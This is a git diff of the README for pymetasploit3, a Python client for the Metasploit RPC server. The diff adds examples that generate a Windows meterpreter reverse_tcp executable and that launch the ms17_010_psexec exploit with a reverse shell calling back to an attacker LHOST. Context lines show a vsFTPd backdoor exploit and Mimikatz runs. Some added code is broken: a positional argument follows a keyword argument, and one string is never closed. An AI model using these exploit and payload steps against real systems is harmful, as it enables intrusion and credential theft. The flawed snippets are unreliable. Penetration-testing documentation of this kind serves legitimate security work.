@@ -15,7 +15,7 @@ Original project  : https://github.com/allfro/pymetasploit
     cd your-project
     pipenv install --three pymetasploit3
     pipenv shell
-    
+
 or:
 
     pip3 install --user pymetasploit3
@@ -43,18 +43,18 @@ $ msfrpcd -P yourpassword -S
 
 ```python
 >>> from pymetasploit3.msfrpc import MsfRpcClient
->>> client = MsfRpcClient('yourpassword')
+>>> client = MsfRpcClient('yourpassword', ssl=True)
 ```
 ### Connecting to `msfconsole` with `msgrpc` plugin loaded
 
 ```python
 >>> from pymetasploit3.msfrpc import MsfRpcClient
->>> client = MsfRpcClient('yourpassword', port=55552)
+>>> client = MsfRpcClient('yourpassword', port=55552, True)
 ```
 
 ### MsfRpcClient
 
-The `MsfRpcClient` class provides the core functionality to navigate through the Metasploit framework. Use 
+The `MsfRpcClient` class provides the core functionality to navigate through the Metasploit framework. Use
 ```dir(client)``` to see the callable methods.
 
 ```python
@@ -106,9 +106,9 @@ Explore exploit information:
 >>> exploit.options
 ['TCP::send_delay', 'ConnectTimeout', 'SSLVersion', 'VERBOSE', 'SSLCipher', 'CPORT', 'SSLVerifyMode', 'SSL', 'WfsDelay',
 'CHOST', 'ContextInformationFile', 'WORKSPACE', 'EnableContextEncoding', 'TCP::max_send_size', 'Proxies',
-'DisablePayloadHandler', 'RPORT', 'RHOST']
+'DisablePayloadHandler', 'RPORT', 'RHOSTS']
 >>> exploit.missing_required # Required options which haven't been set yet
-['RHOST']
+['RHOSTS']
 >>>
 ```
 
@@ -117,7 +117,7 @@ machine as our exploit target. It's running our favorite version of vsFTPd - 2.3
 module loaded. Our next step is to specify our target:
 
 ```python
->>> exploit['RHOST'] = '172.16.14.145' # IP of our target host
+>>> exploit['RHOSTS'] = '172.16.14.145' # IP of our target host
 >>>
 ```
 
@@ -149,6 +149,38 @@ We know the job ran successfully because `job_id` is `1`. If the module failed t
 >>>
 ```
 
+### generate a payload
+
+Create a payload module object:
+
+```python
+payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')
+```
+
+View module information as described above
+
+Setting runoptions and generate payload
+
+```python
+# set runoptions
+payload.runoptions['BadChars'] = ''
+payload.runoptions['Encoder'] = ''
+payload.runoptions['Format'] = 'exe
+payload.runoptions['NopSledSize'] = 0
+payload.runoptions['ForceEncode'] = False
+# payload.runoptions['Template'] = ''
+payload.runoptions['Platform'] = ''
+# payload.runoptions['KeepTemplateWorking'] = True
+payload.runoptions['Iterations'] = 0
+
+data = payload.payload_generate()
+if isinstance(data, str):
+    print(data)
+else:
+    with open('test.exe', 'wb') as f:
+        f.write(data)
+```
+
 ### Interacting with the shell
 Create a shell object out of the session number we found above and write to it:
 
@@ -173,13 +205,13 @@ Run the same `exploit` object as before but wait until it completes and gather i
 ```
 
 `client.sessions.session('1')` has the same `.write('some string')` and `.read()` methods, but running session commands and
- waiting until they're done returning output isn't as simple as console commands. The Metasploit RPC server will return 
- a `busy` value that is `True` or `False` with `client.consoles.console('1').is_busy()` but determining if a 
- `client.sessions.session()`  is done running a command requires us to do it by hand. For this purpose we will use a 
- list of strings that, when any one is found in the session's output, will tell us that the session is done running 
- its command. Below we are running the `arp` command within a meterpreter session. We know this command will return one 
- large blob of text that will contain the characters `----` if it's successfully run so we put that into a list object. 
- 
+ waiting until they're done returning output isn't as simple as console commands. The Metasploit RPC server will return
+ a `busy` value that is `True` or `False` with `client.consoles.console('1').is_busy()` but determining if a
+ `client.sessions.session()`  is done running a command requires us to do it by hand. For this purpose we will use a
+ list of strings that, when any one is found in the session's output, will tell us that the session is done running
+ its command. Below we are running the `arp` command within a meterpreter session. We know this command will return one
+ large blob of text that will contain the characters `----` if it's successfully run so we put that into a list object.
+
  ```python
 >>> session_id = '1'
 >>> session_command = 'arp'
@@ -199,8 +231,8 @@ Run a PowerShell script with output
 'Mimikatz output...'
 ```
 
-One can also use a timeout and simply return all data found before the timeout expired. `timeout` defaults to 
-Metasploit's comm timeout of 300s and will throw an exception if the command timed out. To change this, set 
+One can also use a timeout and simply return all data found before the timeout expired. `timeout` defaults to
+Metasploit's comm timeout of 300s and will throw an exception if the command timed out. To change this, set
  `timeout_exception` to `False` and the library will simply return all the data from the session output it found before
  the timeout expired.
  ```python
@@ -211,6 +243,18 @@ Metasploit's comm timeout of 300s and will throw an exception if the command tim
 # 10s pass
 '\nARP Table\n                  ---------------\n  ...`
 ```
+
+### Configuring payload options
+
+For some usecases you might need to specify payload options, here's an example on how to do so.
+
+	exploit = client.modules.use('exploit', 'windows/smb/ms17_010_psexec')
+	exploit['RHOSTS'] = '172.28.128.13'
+	payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')
+	payload['LHOST'] = '172.28.128.1'
+	payload['LPORT'] = 4444
+	exploit.execute(payload=payload)
+
 
 ### More examples
 
